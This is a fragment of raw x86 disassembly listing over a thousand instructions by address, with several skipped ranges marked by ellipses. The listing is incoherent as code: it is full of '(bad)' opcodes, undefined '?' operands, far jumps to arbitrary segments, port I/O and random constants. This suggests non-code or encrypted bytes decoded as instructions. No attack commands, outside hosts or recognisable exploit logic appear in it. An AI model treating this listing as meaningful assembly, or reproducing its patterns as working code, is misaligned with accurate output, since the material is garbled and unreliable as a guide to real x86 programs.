  41cfb3:	mov    dl,0x69
  41cfb5:	mov    ds:0xc3f09a2c,al
  41cfba:	sti    
  41cfbb:	jmp    0x1d6:0x2c935761
  41cfc2:	das    
  41cfc3:	aas    
  41cfc4:	jae    0x41cff4
  41cfc6:	sbb    eax,0xe67a05f7
  41cfcb:	sti    
  41cfcc:	mov    DWORD PTR ds:0xea4171af,edi
  41cfd2:	adc    al,0xb0
  41cfd4:	push   eax
  41cfd5:	jg     0x41cf94
  41cfd7:	dec    ebp
  41cfd8:	jmp    FWORD PTR [edx-0x1c]
  41cfdb:	cmc    
  41cfdc:	fidivr DWORD PTR [edi]
  41cfde:	popa   
  41cfdf:	(bad)  
  41cfe0:	mov    ecx,0x9a4fa9db
  41cfe5:	call   0xb7e41ad3
  41cfea:	dec    edx
  41cfeb:	push   esi
  41cfec:	inc    eax
  41cfed:	mov    edi,0x5563e361
  41cff2:	retf   
  41cff3:	dec    esp
  41cff4:	fld    TBYTE PTR [edx+0x719b9c12]
  41cffa:	fcmovnu st,st(6)
  41cffc:	xor    bl,BYTE PTR [eax+0x1c]
  41cfff:	mov    edx,0x2c538d21
  41d004:	adc    BYTE PTR [edx],0x1c
  41d007:	jmp    0x3823:0x43982ab1
  41d00e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d00f:	das    
  41d010:	or     al,0xe
  41d012:	or     ebx,esi
  41d014:	push   esi
  41d015:	loop   0x41cfdc
  41d017:	std    
  41d018:	mov    ecx,0xe94942ca
  41d01d:	and    ch,BYTE PTR [edx-0x7c776ab8]
  41d023:	and    DWORD PTR ds:0x35014fb7,ebp
  41d029:	lods   eax,DWORD PTR ds:[esi]
  41d02a:	sets   BYTE PTR [ecx-0x37]
  41d02e:	arpl   WORD PTR ds:0x57936bd2,ax
  41d034:	aam    0xfe
  41d036:	(bad)  
  41d037:	and    eax,0x796b0383
  41d03c:	mov    ds,WORD PTR [edi+edi*2]
  41d03f:	or     DWORD PTR ds:0xc427abe2,ecx
  41d045:	jge    0x41cfea
  41d047:	push   es
  41d048:	mov    esp,0x8cfc76ee
  41d04d:	scas   eax,DWORD PTR es:[edi]
  41d04e:	and    BYTE PTR ds:0xf1ee9796,cl
  41d054:	ror    esi,cl
  41d056:	mov    eax,gs:0x92bb37d6
  41d05c:	popf   
  41d05d:	adc    DWORD PTR [ebx],esi
  41d05f:	xchg   BYTE PTR [ebp-0x15],dl
  41d062:	lods   eax,DWORD PTR ds:[esi]
  41d063:	in     al,dx
  41d064:	mul    ch
  41d066:	fcom   DWORD PTR [edx+0x2e]
  41d069:	add    dl,BYTE PTR [edi-0x4f]
  41d06c:	in     eax,0xd
	...
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x1bcb28bd
  41d0e5:	leave  
  41d0e6:	cmp    BYTE PTR [bx+di],al
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    DWORD PTR [eax],eax
  41d0ed:	add    BYTE PTR [eax+edx*2-0x490cfbbd],ah
  41d0f4:	sub    BYTE PTR [eax+0xa],al
  41d0f7:	(bad)  
  41d0f8:	sbb    bl,BYTE PTR [edx+0x7b]
  41d0fb:	jb     0x41d0cb
  41d0fd:	lock mov eax,0x50cd9925
  41d103:	push   ebx
  41d104:	ror    BYTE PTR [edi],1
  41d106:	into   
  41d107:	call   0xcd5ea29f
  41d10c:	cmp    BYTE PTR [ebp+esi*1+0x2c],bl
  41d110:	mov    DWORD PTR ds:0x418b0e3,esi
  41d116:	shl    DWORD PTR [ebp+0x133d37d3],0xda
  41d11d:	mov    eax,0xa7829c71
  41d122:	and    dh,BYTE PTR [ebx-0x62]
  41d125:	push   ds
  41d126:	das    
  41d127:	sbb    DWORD PTR [ebp-0x2b],ecx
  41d12a:	fucomi st,st(5)
  41d12c:	call   0x1b3e1154
  41d131:	shl    BYTE PTR [esi],0x90
  41d134:	jae    0x41d116
  41d136:	dec    eax
  41d137:	mov    eax,DWORD PTR [esi+edx*8+0x2e]
  41d13b:	pop    ecx
  41d13c:	rol    dl,1
  41d13e:	push   esi
  41d13f:	inc    esi
  41d140:	cmp    al,dh
  41d142:	dec    esp
  41d143:	je     0x41d0ea
  41d145:	pop    eax
  41d146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d147:	mov    bl,BYTE PTR [ebp-0x7e77f4ba]
  41d14d:	pop    ecx
  41d14e:	stc    
  41d14f:	je     0x41d11d
  41d151:	lahf   
  41d152:	adc    al,0xf1
  41d154:	stos   DWORD PTR es:[edi],eax
  41d155:	das    
  41d156:	push   ebx
  41d157:	std    
  41d158:	test   eax,0xc23596cb
  41d15d:	sahf   
  41d15e:	cmp    al,0x23
  41d160:	pop    edx
  41d161:	and    eax,0xb308a958
  41d166:	push   ebp
  41d167:	cmp    BYTE PTR [esi+0x2a],bl
  41d16a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d16b:	pop    esi
  41d16c:	into   
  41d16d:	mov    eax,ds:0xfd759022
  41d172:	xor    al,0x4d
  41d174:	pop    edi
  41d175:	arpl   WORD PTR [edi-0x523e7fc4],sp
  41d17b:	aas    
  41d17c:	xrelease mov BYTE PTR [edi-0x21],cl
  41d180:	push   0x8
  41d182:	or     eax,0xbdb5fc11
  41d187:	adc    eax,0x730ea4e9
  41d18c:	sub    al,0x4e
  41d18e:	jmp    0x85f2:0xeaed4637
  41d195:	sti    
  41d196:	add    edi,DWORD PTR [ebx-0x25cf5468]
  41d19c:	clc    
  41d19d:	stos   DWORD PTR es:[edi],eax
  41d19e:	and    DWORD PTR [edi],esp
  41d1a0:	or     eax,0x8c3c8f83
  41d1a5:	inc    ebx
  41d1a6:	sub    eax,0x9b9f9017
  41d1ab:	add    eax,0x69415c4a
  41d1b0:	arpl   di,dx
  41d1b2:	(bad)  
  41d1b3:	imul   ebp,DWORD PTR [esi+eiz*1+0x1c7ea7fd],0x42a7e12d
  41d1be:	es push esi
  41d1c0:	jb     0x41d1cb
  41d1c2:	fcomi  st,st(1)
  41d1c4:	jo     0x41d1a6
  41d1c6:	mov    ebx,0xdb266eb6
  41d1cb:	adc    ecx,DWORD PTR [edx+0xe]
  41d1ce:	xchg   edi,eax
  41d1cf:	fcomi  st,st(7)
  41d1d1:	ds shl ch,0xbd
  41d1d5:	push   esi
  41d1d6:	adc    al,0x40
  41d1d8:	pusha  
  41d1d9:	cwde   
  41d1da:	int3   
  41d1db:	sub    DWORD PTR [edx+0x7e],0x7ff03015
  41d1e2:	add    dl,cl
  41d1e4:	nop
  41d1e5:	rcl    DWORD PTR [ecx+esi*4],cl
  41d1e8:	adc    cl,dl
  41d1ea:	mov    cl,dl
  41d1ec:	in     al,0x12
	...
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	sahf   
  41d263:	retf   
  41d264:	fistp  WORD PTR [ebx]
  41d266:	cmp    DWORD PTR [bx+di],eax
  41d269:	add    BYTE PTR [eax],al
  41d26b:	add    DWORD PTR [eax],eax
  41d26d:	add    BYTE PTR [edx-0x3],dh
  41d270:	adc    DWORD PTR [ecx+0x4f],edx
  41d273:	jp     0x41d26a
  41d275:	push   edx
  41d276:	xchg   esp,eax
  41d277:	adc    eax,0x928a8658
  41d27c:	inc    eax
  41d27d:	inc    edx
  41d27e:	dec    ebp
  41d27f:	xchg   dh,al
  41d281:	add    eax,DWORD PTR [eax]
  41d283:	pop    ss
  41d284:	rcl    BYTE PTR [esp+eiz*8],cl
  41d287:	rcr    DWORD PTR [edx+0x12],1
  41d28a:	stos   BYTE PTR es:[edi],al
  41d28b:	push   DWORD PTR [ecx+ecx*2+0x65]
  41d28f:	iret   
  41d290:	outs   dx,BYTE PTR ds:[esi]
  41d291:	ret    0xd92a
  41d294:	sbb    DWORD PTR [ebx],esi
  41d296:	mov    al,0xfb
  41d298:	push   es
  41d299:	shl    esi,1
  41d29b:	jecxz  0x41d28d
  41d29d:	cld    
  41d29e:	dec    esi
  41d29f:	sahf   
  41d2a0:	nop
  41d2a1:	xor    BYTE PTR [eax-0x32303c3b],al
  41d2a7:	pop    edx
  41d2a8:	and    bl,dl
  41d2aa:	repz cwde 
  41d2ac:	addr16 daa 
  41d2ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2af:	mov    edi,0x5fe106f8
  41d2b5:	sbb    eax,0xe7d8eba
  41d2ba:	cmc    
  41d2bb:	xor    BYTE PTR [ecx],ch
  41d2bd:	aas    
  41d2be:	inc    ebp
  41d2bf:	pop    edi
  41d2c0:	stc    
  41d2c1:	leave  
  41d2c2:	fdivr  DWORD PTR [ecx-0x6455f2bc]
  41d2c8:	jmp    0x41d24f
  41d2ca:	mov    ?,WORD PTR [edi-0x5cc4aaa5]
  41d2d0:	out    dx,al
  41d2d1:	cld    
  41d2d2:	or     eax,DWORD PTR [edi]
  41d2d4:	mov    al,dh
  41d2d6:	and    eax,0x7ec5c10b
  41d2db:	out    dx,eax
  41d2dc:	loope  0x41d35a
  41d2de:	ja     0x41d34e
  41d2e0:	fisubr WORD PTR [ebx-0x40]
  41d2e3:	into   
  41d2e4:	sbb    al,0xbd
  41d2e6:	(bad)  
  41d2e7:	xlat   BYTE PTR ds:[ebx]
  41d2e8:	cmp    al,0xe2
  41d2ea:	mov    edi,0x24735887
  41d2ef:	aas    
  41d2f0:	jnp    0x41d36d
  41d2f2:	inc    ebx
  41d2f3:	mov    edx,0x78f52781
  41d2f8:	cmp    al,0x80
  41d2fa:	retf   0xe740
  41d2fd:	leave  
  41d2fe:	dec    esi
  41d2ff:	push   eax
  41d300:	adc    al,0x36
  41d302:	(bad)  
  41d303:	xor    BYTE PTR [esi],ch
  41d305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d306:	iret   
  41d307:	stc    
  41d308:	or     edx,ebx
  41d30a:	dec    esp
  41d30b:	mov    ds,WORD PTR [eax+0x33eacb2d]
  41d311:	add    esp,ebp
  41d313:	loope  0x41d29e
  41d315:	ins    BYTE PTR es:[edi],dx
  41d316:	pop    edx
  41d317:	(bad)  
  41d318:	dec    ecx
  41d319:	int    0x21
  41d31b:	sbb    DWORD PTR [ebx],esp
  41d31d:	or     BYTE PTR [esi+eiz*1],bh
  41d320:	pop    edx
  41d321:	mov    edx,0x8fb796c9
  41d326:	test   al,0xa9
  41d328:	repnz enter 0x1549,0x76
  41d32d:	(bad)  
  41d32e:	retf   
  41d32f:	inc    BYTE PTR [edi-0x596d449]
  41d335:	jns    0x41d352
  41d337:	sub    DWORD PTR [ebp-0x44],0x4ff03cb6
  41d33e:	leave  
  41d33f:	in     al,dx
  41d340:	xchg   esi,eax
  41d341:	mov    WORD PTR [edx-0x683d7208],gs
  41d347:	(bad)  
  41d348:	jae    0x41d398
  41d34a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d34b:	or     ch,BYTE PTR [edx]
  41d34d:	push   edi
  41d34e:	mov    al,ds:0xf1ff068d
  41d353:	mov    esp,0x15a7af63
  41d358:	jae    0x41d30a
  41d35a:	mov    cl,bl
  41d35c:	inc    ebx
  41d35d:	cmp    bl,BYTE PTR [ebx-0x3a]
  41d360:	loop   0x41d3a4
  41d362:	sbb    edx,DWORD PTR [esi+0x522bb18b]
  41d368:	pushf  
  41d369:	or     bh,dh
  41d36b:	mov    ebx,0x1210
	...
  41d3d4:	add    BYTE PTR [eax],al
  41d3d6:	inc    BYTE PTR [eax+0x7dff54f9]
  41d3dc:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d3e2:	fld    QWORD PTR [ebp+0x75]
  41d3e5:	add    ah,BYTE PTR [edi+0x3a]
  41d3e8:	add    DWORD PTR [eax],eax
  41d3ea:	add    BYTE PTR [ecx],al
  41d3ec:	add    BYTE PTR [eax],al
  41d3ee:	mov    edi,es
  41d3f0:	dec    ebx
  41d3f1:	pusha  
  41d3f2:	or     esp,DWORD PTR [eax+0x6314f420]
  41d3f8:	std    
  41d3f9:	inc    ebp
  41d3fa:	rcr    BYTE PTR [edi],0x63
  41d3fd:	inc    eax
  41d3fe:	adc    esp,DWORD PTR [edi+0x7e]
  41d401:	sbb    al,0x57
  41d403:	cmc    
  41d404:	push   edi
  41d405:	sub    al,0x68
  41d407:	and    bl,bh
  41d409:	xor    dh,BYTE PTR [ecx]
  41d40b:	add    dh,BYTE PTR ss:[eax+0x342d6f40]
  41d412:	mov    eax,ds:0x180cbedb
  41d418:	cmp    eax,0x6284ec3b
  41d41d:	adc    DWORD PTR [edi],ebx
  41d41f:	add    ebp,ecx
  41d421:	pop    edi
  41d422:	pop    esi
  41d423:	rol    esi,1
  41d425:	out    0x2c,al
  41d427:	and    al,0x40
  41d429:	test   eax,0xd10b5890
  41d42e:	loop   0x41d43e
  41d430:	add    al,0x8
  41d432:	adc    eax,0x62855141
  41d437:	mov    dh,0xaf
  41d439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d43a:	aad    0x26
  41d43c:	xchg   DWORD PTR [esi],ebp
  41d43e:	mov    dl,0x22
  41d440:	cdq    
  41d441:	adc    bl,0xd2
  41d444:	sbb    al,0xc
  41d446:	mov    ecx,0xfcf1ea9d
  41d44b:	xchg   cl,dl
  41d44d:	push   edi
  41d44e:	and    ecx,ebx
  41d450:	gs inc ecx
  41d452:	mov    bl,0xc2
  41d454:	ret    0x85e
  41d457:	mov    ss,WORD PTR [eax-0x25e95775]
  41d45d:	test   eax,0xa0bcbae7
  41d462:	loop   0x41d444
  41d464:	mov    ds:0x13adc898,eax
  41d469:	push   edx
  41d46a:	mov    BYTE PTR [edx+esi*4-0x3e],0xb5
  41d46f:	loope  0x41d456
  41d471:	pop    esp
  41d472:	imul   esi,DWORD PTR [edx-0x508cf0c7],0x51fc4d6b
  41d47c:	mov    ah,0x63
  41d47e:	push   esp
  41d47f:	xor    BYTE PTR [ecx+0x25],dl
  41d482:	adc    esi,DWORD PTR [ebx+0x2c9482bf]
  41d488:	loopne 0x41d435
  41d48a:	lahf   
  41d48b:	jmp    0x9c95:0x9a679f1c
  41d492:	adc    ch,bl
  41d494:	popa   
  41d495:	arpl   WORD PTR [ebx],bx
  41d497:	and    eax,0xe1125fb4
  41d49c:	jo     0x41d503
  41d49e:	pop    ebx
  41d49f:	mov    al,ds:0x9879ab15
  41d4a4:	dec    DWORD PTR [edx+0x0]
  41d4a7:	xor    DWORD PTR [eax+0x14],0x5bf65455
  41d4ae:	adc    esi,DWORD PTR [eax]
  41d4b0:	jae    0x41d4b6
  41d4b2:	(bad)  
  41d4b3:	sub    ebp,eax
  41d4b5:	dec    eax
  41d4b6:	clc    
  41d4b7:	stc    
  41d4b8:	aaa    
  41d4b9:	pushf  
  41d4ba:	iret   
  41d4bb:	push   esp
  41d4bc:	out    dx,al
  41d4bd:	mov    esp,0x339c83aa
  41d4c2:	loopne 0x41d459
  41d4c4:	push   edi
  41d4c5:	mov    ch,0xd
  41d4c7:	mov    eax,DWORD PTR [edi-0x30]
  41d4ca:	es (bad) 
  41d4cc:	daa    
  41d4cd:	push   cs
  41d4ce:	xor    al,0xba
  41d4d0:	out    dx,eax
  41d4d1:	sbb    eax,0x6428d438
  41d4d6:	loope  0x41d557
  41d4d8:	mov    ebx,0x469f6ee
  41d4dd:	movups xmm7,xmm4
  41d4e0:	fld    QWORD PTR [esi]
  41d4e2:	cmc    
  41d4e3:	or     BYTE PTR [eax+eax*8+0x52],bh
  41d4e7:	imul   ebx,DWORD PTR [ebx],0x4d01c75f
  41d4ed:	sub    al,BYTE PTR [eax]
	...
  41d553:	add    BYTE PTR [eax],al
  41d555:	add    dh,dh
  41d557:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x670a:0xceda6889
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [ecx+ebp*2+0x2ee84b87],al
  41d574:	mov    ebp,ecx
  41d576:	sbb    ebx,edx
  41d578:	pop    edx
  41d579:	or     eax,0x2eedde1e
  41d57e:	test   DWORD PTR [edx],esi
  41d580:	pop    ecx
  41d581:	iret   
  41d582:	jno    0x41d5b8
  41d584:	inc    ecx
  41d585:	sbb    bh,BYTE PTR [ecx]
  41d587:	es test al,0x1
  41d58a:	xor    al,0xa3
  41d58c:	adc    ecx,DWORD PTR [ebp-0x36]
  41d58f:	ftst   
  41d591:	pop    ebx
  41d592:	jo     0x41d609
  41d594:	test   ebx,eax
  41d596:	(bad)  
  41d598:	pusha  
  41d599:	es aaa 
  41d59b:	push   esp
  41d59c:	or     BYTE PTR [ebx],bl
  41d59e:	pop    edx
  41d59f:	inc    esi
  41d5a0:	dec    eax
  41d5a1:	imul   eax,DWORD PTR [esi],0x2e1fe03e
  41d5a7:	push   eax
  41d5a8:	es cmc 
  41d5aa:	ret    0x893a
  41d5ad:	repnz sub al,0x5b
  41d5b0:	jae    0x41d547
  41d5b2:	nop
  41d5b3:	retf   0x763c
  41d5b6:	mov    ebx,DWORD PTR [ebp-0x64469716]
  41d5bc:	nop
  41d5bd:	data16 adc BYTE PTR [edx-0x26f94659],bl
  41d5c4:	or     ah,BYTE PTR [edi+0x771d88a0]
  41d5ca:	push   eax
  41d5cb:	cmp    DWORD PTR [eax],esp
  41d5cd:	icebp  
  41d5ce:	add    ecx,DWORD PTR [edi+0x26]
  41d5d1:	sbb    al,0xac
  41d5d3:	cwde   
  41d5d4:	dec    edi
  41d5d5:	and    ebp,esp
  41d5d7:	leave  
  41d5d8:	fcom   DWORD PTR [esi+0x30eb4c32]
  41d5de:	xor    eax,0xd2da0204
  41d5e3:	push   ss
  41d5e4:	outs   dx,DWORD PTR ds:[esi]
  41d5e5:	mov    eax,ds:0xe8453948
  41d5ea:	jmp    0x41d5be
  41d5ec:	push   edi
  41d5ed:	adc    edx,DWORD PTR [ecx]
  41d5ef:	adc    BYTE PTR [ebx+0x3f],ch
  41d5f2:	retf   0xf050
  41d5f5:	lods   eax,DWORD PTR ds:[esi]
  41d5f6:	xor    eax,0xc384060a
  41d5fb:	lods   eax,DWORD PTR ds:[esi]
  41d5fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5fd:	enter  0x544,0x7
  41d601:	jo     0x41d5b3
  41d603:	loope  0x41d638
  41d605:	(bad)  
  41d607:	xchg   ebp,eax
  41d608:	pop    eax
  41d609:	sub    BYTE PTR [edi+0x6f],cl
  41d60c:	pop    edx
  41d60d:	mov    eax,ds:0xd3e0010b
  41d612:	call   0xb01c:0x9431a127
  41d619:	pop    esi
  41d61a:	dec    esi
  41d61b:	out    dx,eax
  41d61c:	mov    esp,ecx
  41d61e:	mov    edx,0x4182ab66
  41d623:	inc    edx
  41d624:	and    cl,BYTE PTR [edi-0x1acf6cb3]
  41d62a:	push   ebp
  41d62b:	pusha  
  41d62c:	dec    ecx
  41d62d:	push   esi
  41d62e:	mov    ecx,0x183a7c6d
  41d633:	(bad)  
  41d634:	pop    esp
  41d635:	fwait
  41d636:	cmp    ebp,esp
  41d638:	inc    ebp
  41d63a:	pusha  
  41d63b:	mov    WORD PTR [esi-0x6d],?
  41d63e:	jge    0x41d64a
  41d640:	fwait
  41d641:	fwait
  41d642:	push   esi
  41d643:	repz jno 0x41d6ad
  41d646:	div    BYTE PTR [ebp-0x73]
  41d649:	adc    DWORD PTR [esp+esi*1-0xc1707a4],0xba5ee643
  41d654:	fs enter 0x1595,0x9f
  41d659:	mov    esp,0xffeef8f4
  41d65e:	aam    0x29
  41d660:	lods   eax,DWORD PTR ds:[esi]
  41d661:	mov    ecx,0xf2b76a35
  41d666:	cmp    DWORD PTR [edx],eax
  41d668:	cmp    bl,BYTE PTR [esi]
  41d66a:	int3   
  41d66b:	jne    0x41d65b
  41d66d:	add    BYTE PTR cs:[eax],al
	...
  41d6d4:	add    BYTE PTR [eax],al
  41d6d6:	jl     0x41d671
  41d6d8:	dec    esp
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x2a66e435
  41d6e3:	ds in  al,0x44
  41d6e6:	addr16 cmp al,0x1
  41d6e9:	add    BYTE PTR [eax],al
  41d6eb:	add    DWORD PTR [eax],eax
  41d6ed:	add    BYTE PTR [eax+0xd5f6022],dl
  41d6f3:	xchg   ebp,ebx
  41d6f5:	sub    BYTE PTR [eax-0x395ed657],al
  41d6fb:	and    al,0x45
  41d6fd:	sub    DWORD PTR [edx],esi
  41d6ff:	cli    
  41d700:	pop    ebx
  41d701:	ja     0x41d766
  41d703:	cdq    
  41d704:	jge    0x41d6c6
  41d706:	xor    eax,0x650dc756
  41d70b:	push   cs
  41d70c:	retf   0xceda
  41d70f:	gs lahf 
  41d711:	inc    esp
  41d712:	sti    
  41d713:	push   0x5fd5c7b3
  41d718:	sub    al,0x2b
  41d71a:	sub    eax,0x945d22a9
  41d71f:	aas    
  41d720:	sbb    BYTE PTR [ebp-0x3],ah
  41d723:	or     eax,0x3ccbe04a
  41d728:	jp     0x41d799
  41d72a:	fs test al,0x45
  41d72d:	fstp   DWORD PTR [ebx]
  41d72f:	pop    es
  41d730:	stos   BYTE PTR es:[edi],al
  41d731:	mov    ch,0xac
  41d733:	mov    ?,WORD PTR [esi]
  41d735:	cmp    eax,0x6bdc535
  41d73a:	adc    al,0x68
  41d73c:	ss adc eax,0xc511e9e8
  41d742:	(bad)  
  41d743:	cli    
  41d744:	pop    es
  41d745:	mul    DWORD PTR [edi+0x3638104d]
  41d74b:	shr    BYTE PTR [esi],1
  41d74d:	outs   dx,DWORD PTR ds:[esi]
  41d74e:	sti    
  41d74f:	es call 0x62e3ef07
  41d755:	(bad)  
  41d756:	jmp    0xd853:0xf1ddd4bf
  41d75d:	scas   al,BYTE PTR es:[edi]
  41d75e:	jg     0x41d759
  41d760:	inc    esi
  41d761:	xlat   BYTE PTR ds:[ebx]
  41d762:	rcr    DWORD PTR [eax],1
  41d764:	pop    esi
  41d765:	fidiv  WORD PTR [ebp+0x38]
  41d768:	(bad)  
  41d769:	jge    0x41d6f7
  41d76b:	fimul  DWORD PTR [eax-0x1e08171b]
  41d771:	mov    bl,0xd1
  41d773:	dec    esp
  41d774:	xor    bl,0xa4
  41d777:	fucomi st,st(0)
  41d779:	mov    cl,0x32
  41d77b:	loope  0x41d784
  41d77d:	sbb    eax,0x158bdd15
  41d782:	sbb    ebx,esi
  41d784:	mov    ebx,0x576b21dd
  41d789:	or     dh,BYTE PTR [ecx]
  41d78b:	push   esp
  41d78c:	push   ecx
  41d78d:	jbe    0x41d78a
  41d78f:	cwde   
  41d790:	inc    ebx
  41d791:	fidiv  DWORD PTR [edx+0x60fbad6a]
  41d797:	mov    al,0xa8
  41d799:	bound  ecx,QWORD PTR [edx+0x34]
  41d79c:	inc    esi
  41d79d:	retf   
  41d79e:	pop    ebp
  41d79f:	lahf   
  41d7a0:	add    DWORD PTR [eax],edi
  41d7a2:	pop    ebx
  41d7a3:	hlt    
  41d7a4:	enter  0x3c64,0xee
  41d7a8:	push   eax
  41d7a9:	in     eax,dx
  41d7aa:	pop    eax
  41d7ab:	add    eax,0xfabed8f9
  41d7b0:	xchg   BYTE PTR [edi-0x701330ea],dh
  41d7b6:	dec    ebx
  41d7b7:	ret    0x2919
  41d7ba:	mov    ds:0x40a5bb10,al
  41d7bf:	or     DWORD PTR [esi+0x6203dcb3],ebx
  41d7c5:	mov    dh,ch
  41d7c7:	sbb    DWORD PTR [esi+eax*1+0x63f7853],ecx
  41d7ce:	mov    ah,dh
  41d7d0:	data16 data16 xlat BYTE PTR ds:[ebx]
  41d7d3:	aas    
  41d7d4:	jae    0x41d78c
  41d7d6:	leave  
  41d7d7:	and    DWORD PTR [ecx+0x61],eax
  41d7da:	cmp    ch,BYTE PTR [eax+0x1e2b28bd]
  41d7e0:	xchg   esi,eax
  41d7e1:	and    DWORD PTR [edi],0x3a646d80
  41d7e7:	ins    BYTE PTR es:[edi],dx
  41d7e8:	sbb    bh,BYTE PTR [esp+ebx*2]
  41d7eb:	pop    ebp
  41d7ec:	call   0x41d855
	...
  41d855:	add    BYTE PTR [esi+ecx*8],ah
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	inc    esi
  41d863:	dec    edx
  41d864:	fwait
  41d865:	and    ah,BYTE PTR [edi+0x3d]
  41d868:	add    DWORD PTR [eax],eax
  41d86a:	add    BYTE PTR [ecx],al
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	xchg   ecx,eax
  41d86f:	adc    al,0xe5
  41d871:	ja     0x41d816
  41d873:	pop    edx
  41d874:	or     BYTE PTR [edi-0xd8938a6],dl
  41d87a:	popa   
  41d87b:	mov    esi,0x7d46fa96
  41d880:	and    esi,DWORD PTR [ebx-0x1a]
  41d883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d884:	inc    edi
  41d885:	ins    BYTE PTR es:[edi],dx
  41d886:	ja     0x41d89c
  41d888:	cmp    BYTE PTR [ebx+0x6400b201],0xd
  41d88f:	jo     0x41d8a9
  41d891:	or     bl,BYTE PTR [ecx+0x505170bc]
  41d897:	add    edi,esi
  41d899:	sub    eax,0xd04204f7
  41d89e:	lods   al,BYTE PTR ds:[esi]
  41d89f:	lods   al,BYTE PTR ds:[esi]
  41d8a0:	pop    ecx
  41d8a1:	inc    ebx
  41d8a2:	aas    
  41d8a3:	fcmovnb st,st(2)
  41d8a5:	mov    esi,0xb558bd6a
  41d8aa:	test   eax,0x2c27da68
  41d8af:	sub    bh,BYTE PTR [ebx]
  41d8b1:	inc    ecx
  41d8b2:	nop    DWORD PTR [ebx+0x7f]
  41d8b6:	mov    edi,0x78f91f8c
  41d8bb:	inc    ecx
  41d8bc:	pop    edx
  41d8bd:	adc    ch,BYTE PTR [eax+0x6d]
  41d8c0:	jecxz  0x41d8ea
  41d8c2:	sbb    eax,0xa257e870
  41d8c7:	sub    si,WORD PTR [eax+0x19d6cd46]
  41d8ce:	add    al,al
  41d8d0:	mov    ah,0x98
  41d8d2:	inc    ecx
  41d8d3:	(bad)  
  41d8d4:	daa    
  41d8d5:	jae    0x41d91f
  41d8d7:	ret    0x63ec
  41d8da:	sbb    ecx,esp
  41d8dc:	push   edx
  41d8dd:	arpl   WORD PTR [edi+0x5c],cx
  41d8e0:	adc    dl,dl
  41d8e2:	cmp    al,0xb6
  41d8e4:	sub    DWORD PTR [ebp+0x72b85b8a],ecx
  41d8ea:	test   al,0x1
  41d8ec:	dec    ecx
  41d8ed:	jmp    0xddf7:0x517862c2
  41d8f4:	psubb  mm5,mm5
  41d8f7:	pop    eax
  41d8f8:	fs stos DWORD PTR es:[edi],eax
  41d8fa:	bound  edi,QWORD PTR [ebx+0x40461fad]
  41d900:	test   DWORD PTR [edi+0x4f8a3c11],0xa25242b3
  41d90a:	into   
  41d90b:	cmp    BYTE PTR [ecx+0x6970f3cc],0xaf
  41d912:	xor    dh,cl
  41d914:	dec    ebp
  41d915:	rcl    BYTE PTR [eax+0x3b],cl
  41d918:	push   ss
  41d919:	mov    ecx,0x7125f05e
  41d91e:	out    dx,eax
  41d91f:	mov    eax,0x7c3fe943
  41d924:	clc    
  41d925:	xor    al,0x9c
  41d927:	shr    BYTE PTR [ebp-0x243c89c5],0xf6
  41d92e:	and    DWORD PTR [ebp+0x2a58d969],ebx
  41d934:	cmp    BYTE PTR [ecx+ecx*4-0x8],al
  41d938:	jmp    0x79bf:0xb104
  41d93e:	in     eax,dx
  41d93f:	jae    0x41d985
  41d941:	mov    bh,0x7b
  41d943:	iret   
  41d944:	stos   DWORD PTR es:[edi],eax
  41d945:	fisttp DWORD PTR [edi]
  41d947:	std    
  41d948:	jecxz  0x41d996
  41d94a:	(bad)
  41d94d:	rcr    DWORD PTR [eax-0x28860e81],0x8f
  41d954:	(bad)  
  41d955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d956:	jmp    0x8c11:0x3c7fb4bc
  41d95d:	xchg   esp,eax
  41d95e:	cmp    dl,BYTE PTR [esi+0x52029c3e]
  41d964:	push   ebx
  41d965:	pop    esp
  41d966:	jge    0x41d930
  41d968:	or     eax,0x202cdd14
  41d96d:	jl     0x41d96f
	...
  41d9d3:	add    BYTE PTR [eax],al
  41d9d5:	add    ah,al
  41d9d7:	ins    BYTE PTR es:[edi],dx
  41d9d8:	pop    es
  41d9d9:	pushf  
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	fnsave gs:[ecx+0x3e67d062]
  41d9e8:	add    DWORD PTR [eax],eax
  41d9ea:	add    BYTE PTR [ecx],al
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9f0:	mov    esi,0x7e1d9a4e
  41d9f5:	sbb    eax,0xaf8dae2d
  41d9fa:	push   ecx
  41d9fb:	xor    dh,ch
  41d9fd:	std    
  41d9fe:	xor    eax,0x3c1a6851
  41da03:	mov    bh,dh
  41da05:	and    eax,0xe9646a5e
  41da0a:	mov    al,ds:0xbe709c07
  41da0f:	mov    dh,0x6e
  41da11:	loop   0x41d9a7
